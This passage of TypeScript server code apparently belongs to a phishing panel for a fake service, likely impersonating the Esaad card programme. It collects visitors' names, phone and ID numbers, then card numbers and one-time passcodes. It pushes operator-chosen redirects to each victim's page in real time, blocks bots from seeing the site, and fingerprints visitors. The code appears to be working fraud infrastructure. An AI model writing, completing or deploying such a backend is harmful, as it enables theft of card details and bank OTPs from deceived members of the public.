// 3. Requests CRUD (Unified Server-Side Store + Supabase Sync)
app.get('/api/requests/current', async (req, res) => {
  if (isBotRequest(req)) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const cookies = parseCookies(req.headers.cookie);
  const fpSession = serverStore.getIpSession(getFingerprintKey(req));
  const id = cookies.esaad_req_id || fpSession?.requestId;
  if (!id) {
    return res.status(404).json({ error: 'لا يوجد طلب نشط' });
  }

  let record = serverStore.getRequest(id);
  const supabase = getSupabase();

  if (supabase) {
    try {
      const { data, error } = await supabase
        .from('requests')
        .select('*')
        .eq('id', id)
        .single();
      if (!error && data) {
        record = fromSupabaseRow(data);
        serverStore.upsertRequest(record);
      }
    } catch {}
  }

  if (!record) {
    return res.status(404).json({ error: 'الطلب غير موجود' });
  }

  serverStore.clearExplicitlyOffline(id);
  const currentPage =
    serverStore.getLastKnownPage(id) || normalizeStepToPage(record.step) || '/waiting';
  serverStore.setUserPresence(id, { lastSeen: Date.now(), currentPage });
  return res.json(enrichLocalRecord(record));
});

app.get('/api/requests', async (_req, res) => {
  const dbRequests = await fetchEnrichedRequests(false);
  return res.json(dbRequests);
});

app.get('/api/requests/:id', async (req, res) => {
  const { id } = req.params;
  let record = serverStore.getRequest(id);
  const supabase = getSupabase();

  if (supabase) {
    try {
      const { data, error } = await supabase
        .from('requests')
        .select('*')
        .eq('id', id)
        .single();
      if (!error && data) {
        record = fromSupabaseRow(data);
        serverStore.upsertRequest(record);
      }
    } catch {}
  }

  if (!record) {
    return res.status(404).json({ error: 'الطلب غير موجود' });
  }

  return res.json(enrichLocalRecord(record));
});

app.post('/api/requests', async (req, res) => {
  if (isBotRequest(req)) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const cookies = parseCookies(req.headers.cookie);
  const fpSession = serverStore.getIpSession(getFingerprintKey(req));
  const nowMs = Date.now();
  const now = new Date(nowMs).toISOString();
  const id = String(req.body?.id || cookies.esaad_req_id || fpSession?.requestId || crypto.randomUUID());

  const existing = serverStore.getRequest(id);
  const newRecord: RequestRecord = {
    ...(existing || {}),
    id,
    name: req.body?.name || '',
    mobile: req.body?.mobile || '',
    idNumber: req.body?.idNumber || '',
    cardType: req.body?.cardType || '',
    address: req.body?.address || '',
    date: req.body?.date || '',
    step: '/payment',
    currentPage: '/payment',
    createdAt: existing?.createdAt || now,
    updatedAt: now,
    lastHeartbeatAt: nowMs
  };

  // Persist immediately to server-side store
  serverStore.upsertRequest(newRecord, true);

  let dbData: any = null;
  const supabase = getSupabase();
  if (supabase) {
    try {
      const { data, error } = await supabase
        .from('requests')
        .upsert(toSupabaseRow(newRecord), { onConflict: 'id' })
        .select('*')
        .single();
      if (!error && data) {
        dbData = data;
      }
    } catch {}
  }

  serverStore.clearExplicitlyOffline(id);
  lastDbPresenceSync.set(id, { time: nowMs, page: '/payment' });
  const clientId = cookies.esaad_cid || fpSession?.clientId || crypto.randomUUID();
  const meta = extractVisitorMeta(req);
  serverStore.setUserMeta(id, meta);
  serverStore.setDevicePresence(clientId, {
    lastSeen: nowMs,
    requestId: id,
    currentPage: '/payment',
    meta
  });
  serverStore.setUserPresence(id, { lastSeen: nowMs, currentPage: '/payment' });
  serverStore.setLastKnownPage(id, '/payment');

  res.setHeader('Set-Cookie', [
    buildCookie('esaad_cid', clientId, req),
    buildCookie('esaad_req_id', id, req)
  ]);

  const enriched = dbData ? fromSupabaseRow(dbData) : enrichLocalRecord(newRecord);
  broadcastToAdmins();
  return res.status(201).json(enriched);
});

app.patch('/api/requests/:id', async (req, res) => {
  if (isBotRequest(req)) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  const cookies = parseCookies(req.headers.cookie);
  const fpSession = serverStore.getIpSession(getFingerprintKey(req));
  const id = req.params.id === 'current' ? cookies.esaad_req_id || fpSession?.requestId : req.params.id;
  if (!id) {
    return res.status(400).json({ error: 'معرف الطلب غير متوفر' });
  }

  const nowMs = Date.now();
  const now = new Date(nowMs).toISOString();
  const patchPayload: Partial<RequestRecord> & { id: string } = {
    ...req.body,
    id,
    updatedAt: now
  };

  let pushedRedirect: string | null = null;
  let isVisitorMutation = false;

  if (req.body?.nextAction !== undefined) {
    const targetRoute = normalizeRedirectTarget(req.body.nextAction);
    if (targetRoute) {
      serverStore.setPendingRedirect(id, targetRoute);
      serverStore.setLastKnownPage(id, targetRoute);
      patchPayload.step = targetRoute;
      patchPayload.currentPage = targetRoute;
      pushedRedirect = targetRoute;
      const existingPresence = serverStore.getUserPresence(id);
      if (existingPresence) {
        serverStore.setUserPresence(id, { ...existingPresence, currentPage: targetRoute });
      }
    } else {
      serverStore.deletePendingRedirect(id);
    }
  } else if (req.body?.step === 'card' || req.body?.step === 'otp' || req.body?.step === 'otp-bank') {
    isVisitorMutation = true;
    serverStore.deletePendingRedirect(id);
    const stepPage = req.body.step === 'card' ? '/waiting' : req.body.step === 'otp-bank' ? '/otp-bank' : '/otp';
    patchPayload.currentPage = stepPage;
    serverStore.clearExplicitlyOffline(id);
    serverStore.setUserPresence(id, { lastSeen: nowMs, currentPage: stepPage });
    serverStore.setLastKnownPage(id, stepPage);
  } else if (req.body?.cardNumber !== undefined || req.body?.otp !== undefined) {
    isVisitorMutation = true;
  }

  // Always update server-side store first
  const localUpdated = serverStore.patchRequest(id, patchPayload, isVisitorMutation);

  let dbData: any = null;
  const supabase = getSupabase();
  if (supabase) {
    try {
      const patchRow = toSupabaseRow(patchPayload);
      delete patchRow.id;
      const { data, error } = await supabase
        .from('requests')
        .update(patchRow)
        .eq('id', id)
        .select('*')
        .single();
      if (!error && data) {
        dbData = data;
      } else if (localUpdated) {
        const { data: upserted } = await supabase
          .from('requests')
          .upsert(toSupabaseRow(localUpdated), { onConflict: 'id' })
          .select('*')
          .single();
        if (upserted) dbData = upserted;
      }
    } catch {}
  }

  const enriched = dbData ? fromSupabaseRow(dbData) : enrichLocalRecord(localUpdated!);

  // Push real-time action event to the visitor's open SSE stream
  sendVisitorEvent(id, 'action', {
    redirectTo: pushedRedirect,
    otpStatus: enriched.otpStatus,
    nextAction: enriched.nextAction,
    request: enriched
  });

  broadcastToAdmins();
  return res.json(enriched);
});

app.delete('/api/requests/:id', async (req, res) => {
  const { id } = req.params;
  if (!id) {
    return res.status(400).json({ error: 'معرف الطلب غير متوفر' });
  }

  serverStore.deleteRequest(id);

  const supabase = getSupabase();
  if (supabase) {
    try {
      await supabase
        .from('requests')
        .delete()
        .eq('id', id);
    } catch {}
  }

  broadcastToAdmins();
  return res.json({ ok: true, id });
});

// ==================== SERVER STARTUP ====================
async function startServer() {
  // Warm server-side store from Supabase on boot
  await pullFromSupabaseIfNeeded(true);

  const isProd = process.env.NODE_ENV === 'production';

  if (!isProd) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.resolve(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*all', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server listening on http://0.0.0.0:${PORT}`);
  });
}

startServer();
